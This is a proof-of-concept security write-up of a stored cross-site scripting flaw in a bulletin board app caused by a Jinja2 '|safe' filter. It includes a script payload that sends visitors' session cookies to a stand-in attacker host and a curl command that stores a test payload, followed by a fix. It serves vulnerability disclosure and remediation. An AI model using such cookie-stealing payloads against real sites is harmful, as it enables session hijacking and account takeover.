# PoC: Stored XSS — Bulletin Board

## Location
`POST /board` (storage) + `templates/board.html` (rendering)

## Root cause
```html
<p>{{ post['content']|safe }}</p>
```
The `|safe` filter disables Jinja2's automatic HTML escaping, so any HTML or
JavaScript submitted in a post is rendered verbatim for every visitor.

## Exploitation

1. Log in as any employee.
2. Post the following as a bulletin board message:
   ```html
   <script>fetch('https://attacker.example/steal?c=' + document.cookie)</script>
   ```
3. Any user who later loads `/board` — including an admin — executes this
   script in their browser, sending their session cookie to the attacker.
   With that cookie, the attacker can impersonate the admin session directly.

### curl (storing the payload)
```bash
curl -b cookies.txt -X POST http://127.0.0.1:5000/board \
  -d "content=<script>alert(document.cookie)</script>"
```
Reloading `/board` executes the alert — confirming the payload is stored and
unescaped.

## Impact
Session hijacking / account takeover. Because this is *stored* XSS (not
reflected), the payload persists and fires for every visitor to the board,
including higher-privileged users, without needing to trick them into
clicking a crafted link.

## Fix (see `patched` branch)
Remove the `|safe` filter and let Jinja2's default autoescaping handle
output encoding:
```html
<p>{{ post['content'] }}</p>
```
If limited formatting must be allowed, use an allow-list HTML sanitizer
(e.g. `bleach`) server-side before storage, never a blanket `|safe`.
